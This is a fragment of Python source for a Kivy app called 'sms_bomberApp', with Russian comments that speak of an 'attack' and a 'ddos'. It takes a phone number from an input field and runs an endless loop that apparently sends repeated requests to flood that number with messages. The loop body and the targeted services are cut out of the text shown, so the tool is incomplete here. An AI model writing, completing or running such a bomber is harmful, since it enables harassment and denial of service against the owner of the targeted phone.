...
class sms_bomberApp(App):

    def update_console(self, args, response):
        print(response)
        #self.console.text = response["country"]

    def send(self, args, _phone):
        data ={'phone': _phone }
        R = 0
        print(data)   
        #self.console.text = "Атака началась"  
        while True:                                                  
            try:
    ...
    def ddos(self, args):
        self.button.text = "Остановить" #когда начался ддос - возможность остановить(доделать)
        print("test")
        number = self.number_input.text # munber = 88005553535
        #self.console.text = "Завершено " + number
        self.send(self, _phone=number) 
